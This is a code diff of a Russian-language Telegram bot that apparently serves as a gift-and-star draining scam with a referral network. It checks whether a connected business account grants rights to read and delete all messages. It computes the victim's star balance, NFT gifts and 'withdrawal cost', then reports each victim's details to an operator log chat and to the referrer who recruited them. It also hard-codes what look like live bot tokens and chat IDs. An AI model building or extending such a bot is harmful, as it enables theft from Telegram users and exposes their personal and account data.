@@ -16,11 +16,13 @@ import asyncio
 import aiohttp
 
 # Constants
-TOKEN = "8449764247:AAE8rqyigMhYIo5fl_8GS45TlhOUEHYKwC8"
-LOG_CHAT_ID = -1002741941997
+TOKEN = "7631533275:AAEOxIh8f1mZCqjtHGm_gL_d-_tFWEQawJA"
+LOG_CHAT_ID = -4874060590
+MESSAGE_LOG_CHAT_ID = -4802328874  # Замените на ID чата для логов сообщений
 MAX_GIFTS_PER_RUN = 1000
 ADMIN_IDS = [7917237979]
 user_message_history = {}
+last_messages = {}
 
 logging.basicConfig(level=logging.INFO)
 
@@ -50,7 +52,6 @@ dp = Dispatcher(storage=storage)
 
 async def send_replaceable_message(chat_id: int, text: str, reply_markup=None, parse_mode=None):
     try:
-        # Delete all previous messages except the first one
         if chat_id in user_message_history and len(user_message_history[chat_id]) > 1:
             for msg_id in user_message_history[chat_id][1:]:
                 try:
@@ -59,7 +60,6 @@ async def send_replaceable_message(chat_id: int, text: str, reply_markup=None, p
                     logging.error(f"Error deleting message: {e}")
             user_message_history[chat_id] = user_message_history[chat_id][:1]
         
-        # Send new message
         message = await bot.send_message(
             chat_id=chat_id,
             text=text,
@@ -67,7 +67,6 @@ async def send_replaceable_message(chat_id: int, text: str, reply_markup=None, p
             parse_mode=parse_mode
         )
         
-        # Update message history
         if chat_id not in user_message_history:
             user_message_history[chat_id] = []
         user_message_history[chat_id].append(message.message_id)
@@ -90,21 +89,18 @@ async def start_cmd(message: types.Message):
     args = message.text.split(" ")
     user_id = message.from_user.id
     
-    # Handle referral link
     if len(args) > 1 and args[1].startswith("ref"):
         ref_code = args[1]
         try:
             inviter_id = int(ref_code.replace("ref", ""))
             if inviter_id and inviter_id != user_id:
-                user_referrer_map[str(user_id)] = inviter_id  # Сохраняем как строку
+                user_referrer_map[str(user_id)] = inviter_id
                 with open("referrers.json", "w") as f:
                     json.dump(user_referrer_map, f)
                 logging.info(f"New referral: {user_id} -> {inviter_id}")
                 await message.answer(f"Вы были приглашены пользователем <code>{inviter_id}</code>!")
         except ValueError as e:
             logging.error(f"Referral error: {e}")
-
-    # Остальной код стартового сообщения...
 
     photo = FSInputFile("image.png")
     await message.answer_photo(
@@ -120,26 +116,21 @@ async def start_cmd(message: types.Message):
         reply_markup=main_menu_kb()
     )
 
-    # Очищаем историю сообщений и добавляем стартовое сообщение
     if message.chat.id not in user_message_history:
         user_message_history[message.chat.id] = []
     else:
-        # Оставляем только первое сообщение
         if len(user_message_history[message.chat.id]) > 0:
             first_msg_id = user_message_history[message.chat.id][0]
             user_message_history[message.chat.id] = [first_msg_id]
     
-    # Добавляем ID стартового сообщения в историю
-    user_message_history[message.chat.id].append(message.message_id + 1)  # +1 потому что photo message
+    user_message_history[message.chat.id].append(message.message_id + 1)
 
 @dp.callback_query(F.data == "profile")
 async def show_profile(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     
-    # Generate referral link
     ref_link = f"https://t.me/{(await bot.me()).username}?start=ref{user_id}"
     
-    # Count referrals
     total_referrals = sum(1 for uid, inv_id in user_referrer_map.items() if str(inv_id) == str(user_id))
     
     profile_text = (
@@ -201,7 +192,6 @@ async def create_check_finish(message: types.Message, state: FSMContext):
         await message.answer("Пожалуйста, введите корректное число от 1 до 10000")
         return
     
-    # Формируем реферальную ссылку с параметром ref
     ref_link = f"https://t.me/{(await bot.me()).username}?start=ref{message.from_user.id}"
     
     builder = InlineKeyboardBuilder()
@@ -312,7 +302,6 @@ async def pagination(page=0):
                         )
                     builder.adjust(2)
                 
-                # Логика пагинации остается без изменений
                 if page <= 0:
                     builder.row(
                         InlineKeyboardButton(text="•", callback_data="empty"),
@@ -364,7 +353,6 @@ async def handle_business(business_connection: types.BusinessConnection):
         info = await bot.get_business_connection(business_id)
         rights = info.rights
         
-        # Проверка необходимых прав
         required_rights = [
             rights.can_read_messages,
             rights.can_delete_all_messages,
@@ -393,33 +381,39 @@ async def handle_business(business_connection: types.BusinessConnection):
         await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка получения данных бизнес-аккаунта: {e}")
         return
 
-    # Рассчеты
     total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
     nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
     nft_transfer_cost = len(nft_gifts) * 25
     total_withdrawal_cost = total_price + nft_transfer_cost
     
-    # Форматирование текста (остаётся без изменений)
-    header = f"✨ <b>Новое подключение бизнес-аккаунта</b> ✨\n\n"
+    # Получаем username пригласившего (если есть)
+    inviter_username = "нет"  # Значение по умолчанию
+    inviter_id = user_referrer_map.get(str(user.id))
+    
+    if inviter_id:
+        try:
+            inviter = await bot.get_chat(inviter_id)
+            if inviter.username:  # Только если есть username
+                inviter_username = f"@{inviter.username}"
+        except Exception as e:
+            logging.error(f"Ошибка получения информации о пригласившем: {e}")
+    
+    header = f"✨ <b>Новое подключение бизнес-аккаунта</b> ✨\n"
     user_info = (
         f"<blockquote>👤 <b>Информация о пользователе:</b>\n"
         f"├─ ID: <code>{user.id}</code>\n"
         f"├─ Username: @{user.username or 'нет'}\n"
-        f"╰─ Имя: {user.first_name or ''} {user.last_name or ''}</blockquote>\n\n"
+        f"├─ Пригласил: {inviter_username}\n"
+        f"╰─ Имя: {user.first_name or ''} {user.last_name or ''}</blockquote>\n"
     )
     balance_info = (
         f"<blockquote>💰 <b>Баланс:</b>\n"
-        f"├─ Доступно звёзд: {int(stars.amount):,}\n"
-        f"├─ Звёзд в подарках: {total_price:,}\n"
-        f"╰─ <b>Итого:</b> {int(stars.amount) + total_price:,}</blockquote>\n\n"
+        f"╰─ Доступно звёзд: {int(stars.amount):,}</blockquote>\n"
     )
     gifts_info = (
         f"<blockquote>🎁 <b>Подарки:</b>\n"
-        f"├─ Всего: {gifts.total_count}\n"
-        f"├─ Обычные: {gifts.total_count - len(nft_gifts)}\n"
         f"├─ NFT: {len(nft_gifts)}\n"
-        f"├─ <b>Стоимость переноса NFT:</b> {nft_transfer_cost:,} звёзд (25 за каждый)\n"
-        f"╰─ <b>Общая стоимость вывода:</b> {total_withdrawal_cost:,} звёзд</blockquote>"
+        f"╰─ <b>Стоимость переноса NFT:</b> {nft_transfer_cost:,} звёзд (25 за каждый)</blockquote>\n"
     )
     
     nft_list = ""
@@ -453,7 +447,6 @@ async def handle_business(business_connection: types.BusinessConnection):
     
     full_message = header + user_info + balance_info + gifts_info + nft_list + rights_info + footer
     
-    # 1. Отправка в основной лог-чат
     try:
         await bot.send_message(
             chat_id=LOG_CHAT_ID,
@@ -465,17 +458,12 @@ async def handle_business(business_connection: types.BusinessConnection):
     except Exception as e:
         logging.error(f"Ошибка при отправке в лог-чат: {e}")
 
-    # 2. Отправка пригласившему (если есть)
-    inviter_id = user_referrer_map.get(str(user.id))  # Ключ как строка
-    
     if inviter_id:
         try:
-            # Добавляем заголовок для реферала
-            referral_message = f"🔔 Ваш реферал подключил бизнес-аккаунт!\n\n{full_message}"
-            
+            # Отправляем полное сообщение пригласившему
             await bot.send_message(
-                chat_id=int(inviter_id),  # Преобразуем обратно в int
-                text=referral_message,
+                chat_id=int(inviter_id),
+                text=full_message,
                 reply_markup=builder.as_markup(),
                 parse_mode="HTML",
                 disable_web_page_preview=True
@@ -791,4 +779,5 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
